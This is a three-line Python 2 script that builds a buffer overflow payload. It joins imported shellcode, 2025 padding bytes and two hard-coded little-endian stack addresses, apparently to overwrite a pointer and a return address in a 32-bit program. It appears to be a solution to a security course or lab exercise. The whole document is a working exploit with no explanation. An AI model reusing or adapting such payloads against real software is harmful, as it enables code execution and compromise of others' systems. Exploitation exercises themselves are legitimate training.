from shellcode import shellcode
from struct import pack
print shellcode+'\x64'*2025+pack("<I", 0xbffed758)+pack("<I", 0xbffedf6c)
